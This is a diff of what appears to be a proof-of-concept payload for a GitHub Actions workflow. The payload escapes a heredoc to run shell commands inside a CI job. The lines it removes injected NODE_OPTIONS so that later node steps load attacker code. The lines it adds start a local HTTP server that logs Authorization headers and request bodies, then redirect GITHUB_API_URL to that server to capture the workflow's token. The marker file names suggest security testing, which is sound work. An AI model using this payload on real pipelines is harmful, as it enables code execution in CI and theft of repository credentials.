@@ -14,8 +14,21 @@ jobs:
           <ul><li>settings.gradle
           EOF
           echo "shell-exec-marker=$(id -un)@$(hostname)" > /tmp/gab_rce_marker
-          echo 'NODE_OPTIONS=--require /tmp/gab_require.js' >> "$GITHUB_ENV"
-          printf '%s\n' "require('fs').writeFileSync('/tmp/gab_node_marker','NODE_OPTIONS require executed in a subsequent node action');" > /tmp/gab_require.js
+          cat > /tmp/gab_srv.py <<'PY'
+          import http.server, socketserver
+          class H(http.server.BaseHTTPRequestHandler):
+              def _log(self, body=b''):
+                  open('/tmp/gab_token_capture','a').write(self.path+' | '+str(self.headers.get('Authorization'))+' | '+body.decode('utf8','replace')[:200]+'\n')
+                  self.send_response(200); self.send_header('Content-Type','application/json'); self.end_headers(); self.wfile.write(b'{}')
+              def do_GET(self): self._log()
+              def do_POST(self):
+                  n=int(self.headers.get('Content-Length') or 0); self._log(self.rfile.read(n))
+          socketserver.TCPServer.allow_reuse_address=True
+          socketserver.TCPServer(('127.0.0.1',8081),H).serve_forever()
+          PY
+          nohup python3 /tmp/gab_srv.py >/dev/null 2>&1 &
+          sleep 1
+          echo 'GITHUB_API_URL=http://127.0.0.1:8081' >> "$GITHUB_ENV"
           exit 0
           </li></ul>
           PAYLOAD
